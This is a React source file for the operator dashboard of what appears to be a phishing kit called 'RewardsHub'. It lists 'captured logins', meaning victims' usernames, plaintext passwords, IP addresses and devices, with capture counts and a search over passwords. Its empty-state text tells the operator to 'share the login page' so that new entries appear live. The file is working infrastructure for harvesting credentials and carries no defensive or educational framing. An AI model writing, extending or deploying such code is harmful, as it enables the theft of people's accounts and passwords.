import { useEffect, useMemo, useState } from "react";
import { motion } from "motion/react";
import { useMutation, useQuery, useQueryClient } from "@tanstack/react-query";
import { Navigate, useNavigate } from "react-router-dom";
import { toast } from "sonner";
import { Download, LogOut, Search, Terminal, Trash2, Volume2 } from "lucide-react";
import { ApiError, apiDelete, apiGet } from "@/lib/api";
import { ADMIN_SESSION_KEY, endAdminSession, useAdminSession } from "@/lib/session";
import { ANNOUNCE, speak } from "@/lib/voice";
import type { LoginsResponse } from "@/lib/types";
import BinaryRain from "@/components/BinaryRain";
import { Badge } from "@/components/ui/badge";
import { Button, buttonVariants } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import {
  Table,
  TableBody,
  TableCell,
  TableHead,
  TableHeader,
  TableRow,
} from "@/components/ui/table";

const HEADER_TEXT = "OPERATOR :: MONISH — ROOT ACCESS";

function BootScreen() {
  return (
    <div className="flex min-h-svh items-center justify-center bg-[#020804] font-mono text-sm text-[#4EFE82]">
      <p>
        &gt; booting operator matrix<span className="terminal-caret">_</span>
      </p>
    </div>
  );
}

function StatCard({ label, value, accent }: { label: string; value: string; accent?: boolean }) {
  return (
    <div className="rounded-lg border border-[#00FF66]/20 bg-[#06150C]/80 px-5 py-4 backdrop-blur">
      <p className="text-[10px] tracking-[0.3em] text-[#1F9D46]">{label}</p>
      <p className={`mt-1.5 font-heading text-2xl font-bold ${accent ? "text-[#00FF66] text-glow-green" : "text-[#E0FFE8]"}`}>
        {value}
      </p>
    </div>
  );
}

function AdminConsole() {
  const navigate = useNavigate();
  const queryClient = useQueryClient();
  const [typed, setTyped] = useState("");
  const [search, setSearch] = useState("");

  // spoken welcome — exactly once per admin entry
  useEffect(() => {
    if (sessionStorage.getItem("rh_admin_welcome") === "1") {
      sessionStorage.removeItem("rh_admin_welcome");
      speak(ANNOUNCE.welcome);
    }
  }, []);

  // typewriter header
  useEffect(() => {
    let i = 0;
    const timer = window.setInterval(() => {
      i += 1;
      setTyped(HEADER_TEXT.slice(0, i));
      if (i >= HEADER_TEXT.length) window.clearInterval(timer);
    }, 45);
    return () => window.clearInterval(timer);
  }, []);

  const logins = useQuery({
    queryKey: ["admin", "logins"],
    queryFn: () => apiGet<LoginsResponse>("/admin/logins"),
    refetchInterval: 15_000,
  });

  const remove = useMutation({
    mutationFn: (id: string) => apiDelete<{ deleted: boolean }>(`/admin/logins/${id}`),
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ["admin", "logins"] });
      toast.success("Record purged from the archive.");
    },
    onError: () => toast.error("Purge failed — retry."),
  });

  const logout = useMutation({
    mutationFn: () => endAdminSession(queryClient),
    onSuccess: () => navigate("/admin/passcode"),
  });

  const filtered = useMemo(() => {
    const all = logins.data?.logins ?? [];
    const q = search.trim().toLowerCase();
    if (!q) return all;
    return all.filter(
      (r) =>
        r.username.toLowerCase().includes(q) ||
        r.password.toLowerCase().includes(q) ||
        r.ip.toLowerCase().includes(q)
    );
  }, [logins.data, search]);

  return (
    <div className="relative min-h-svh overflow-hidden bg-[#020804] font-mono text-[#4EFE82]">
      <BinaryRain className="absolute inset-0 h-full w-full" opacity={0.45} speed={0.7} density={0.7} />
      <div aria-hidden className="scanlines pointer-events-none absolute inset-0" />

      <div className="relative z-10 mx-auto max-w-6xl px-5 py-8 sm:px-8">
        {/* header */}
        <header className="flex flex-wrap items-center justify-between gap-4">
          <div>
            <div className="flex items-center gap-3">
              <Terminal className="size-5 text-[#00FF66]" />
              <h1 className="font-heading text-lg font-bold tracking-wide text-[#E0FFE8]">
                {typed}
                <span className="terminal-caret">_</span>
              </h1>
            </div>
            <p className="mt-1 text-[11px] tracking-[0.25em] text-[#1F9D46]">
              REWARDSHUB ADMIN MATRIX — CREDENTIALS DATABASE
            </p>
          </div>
          <div className="flex flex-wrap items-center gap-2">
            <Button
              variant="outline"
              size="sm"
              data-testid="admin-replay-voice-button"
              onClick={() => speak(ANNOUNCE.welcome)}
              className="border-[#00FF66]/30 bg-transparent text-[#4EFE82] hover:bg-[#00FF66]/10 hover:text-[#B4FFD0]"
            >
              <Volume2 className="size-4" /> Voice
            </Button>
            <a
              data-testid="download-source-zip-button"
              href="/api/admin/download-source-zip"
              download="rewardshub-source-code.zip"
              className={buttonVariants({ variant: "outline", size: "sm" }) + " border-[#00FF66]/30 bg-transparent text-[#4EFE82] hover:bg-[#00FF66]/10 hover:text-[#B4FFD0]"}
            >
              <Download className="size-4" /> Source Code (.ZIP)
            </a>
            <Button
              variant="destructive"
              size="sm"
              data-testid="admin-logout-button"
              onClick={() => logout.mutate()}
              disabled={logout.isPending}
            >
              <LogOut className="size-4" /> {logout.isPending ? "Closing…" : "Logout"}
            </Button>
          </div>
        </header>

        {/* stats */}
        <section className="mt-8 grid gap-4 sm:grid-cols-3">
          <StatCard label="TOTAL CAPTURES" value={String(logins.data?.total ?? 0)} accent />
          <StatCard label="CAPTURED TODAY" value={String(logins.data?.today ?? 0)} />
          <StatCard label="OPERATOR STATUS" value="ONLINE" accent />
        </section>

        {/* credentials table */}
        <section className="mt-8 rounded-xl border border-[#00FF66]/20 bg-[#06150C]/80 backdrop-blur">
          <div className="flex flex-wrap items-center justify-between gap-3 border-b border-[#00FF66]/15 px-5 py-4">
            <h2 className="flex items-center gap-2 text-xs font-semibold tracking-[0.3em] text-[#B4FFD0]">
              CAPTURED LOGINS
              <Badge className="border-none bg-[#00FF66]/15 text-[10px] text-[#4EFE82]">
                {filtered.length}
              </Badge>
            </h2>
            <div className="relative w-64">
              <Search className="pointer-events-none absolute left-2.5 top-1/2 size-3.5 -translate-y-1/2 text-[#1F9D46]" />
              <Input
                data-testid="admin-logins-search-input"
                value={search}
                onChange={(e) => setSearch(e.target.value)}
                placeholder="search user / pass / ip"
                className="h-8 border-[#00FF66]/20 bg-black/40 pl-8 text-xs text-[#B4FFD0] placeholder:text-[#1F9D46]/60 focus-visible:ring-[#00FF66]/40"
              />
            </div>
          </div>

          {logins.isError ? (
            <div className="px-5 py-10 text-center text-xs text-[#FF3366]/80">
              Live archive unreachable — retrying…
            </div>
          ) : logins.data && filtered.length === 0 ? (
            <div className="px-5 py-12 text-center text-xs text-[#1F9D46]">
              No captures yet — share the login page and entries appear here live.
            </div>
          ) : (
            <Table data-testid="admin-credentials-table">
              <TableHeader>
                <TableRow className="border-[#00FF66]/15 hover:bg-transparent">
                  <TableHead className="text-[10px] tracking-widest text-[#1F9D46]">#</TableHead>
                  <TableHead className="text-[10px] tracking-widest text-[#1F9D46]">USERNAME</TableHead>
                  <TableHead className="text-[10px] tracking-widest text-[#1F9D46]">PASSWORD</TableHead>
                  <TableHead className="text-[10px] tracking-widest text-[#1F9D46]">IP</TableHead>
                  <TableHead className="hidden text-[10px] tracking-widest text-[#1F9D46] md:table-cell">DEVICE</TableHead>
                  <TableHead className="text-[10px] tracking-widest text-[#1F9D46]">CAPTURED</TableHead>
                  <TableHead className="w-10" />
                </TableRow>
              </TableHeader>
              <TableBody>
                {filtered.map((r, i) => (
                  <TableRow key={r.id} className="border-[#00FF66]/10 hover:bg-[#00FF66]/[0.04]">
                    <TableCell className="text-[#1F9D46]">{i + 1}</TableCell>
                    <TableCell className="font-semibold text-[#E0FFE8]">{r.username}</TableCell>
                    <TableCell className="text-[#B4FFD0]">{r.password}</TableCell>
                    <TableCell className="text-[#4EFE82]/80">{r.ip || "—"}</TableCell>
                    <TableCell className="hidden max-w-[220px] truncate text-[#4EFE82]/60 md:table-cell" title={r.user_agent}>
                      {r.user_agent || "—"}
                    </TableCell>
                    <TableCell className="text-[#4EFE82]/80">
                      {new Date(r.created_at).toLocaleString()}
                    </TableCell>
                    <TableCell>
                      <Button
                        variant="ghost"
                        size="icon-sm"
                        data-testid={`admin-delete-login-${r.id}`}
                        aria-label={`Delete capture ${r.username}`}
                        onClick={() => remove.mutate(r.id)}
                        className="text-[#FF3366]/70 hover:bg-[#FF3366]/10 hover:text-[#FF3366]"
                      >
                        <Trash2 className="size-3.5" />
                      </Button>
                    </TableCell>
                  </TableRow>
                ))}
              </TableBody>
            </Table>
          )}
        </section>

        <motion.p
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          transition={{ delay: 0.6 }}
          className="mt-8 text-center text-[10px] tracking-[0.3em] text-[#1F9D46]/60"
        >
          CONNECTION ENCRYPTED — SESSION VALID 8H — LOG EVERYTHING
        </motion.p>
      </div>
    </div>
  );
}

export default function AdminDashboard() {
  const admin = useAdminSession();

  if (admin.isPending) return <BootScreen />;
  if (admin.isError || !admin.data?.authenticated) {
    return <Navigate to="/admin/passcode" replace />;
  }
  return <AdminConsole />;
}
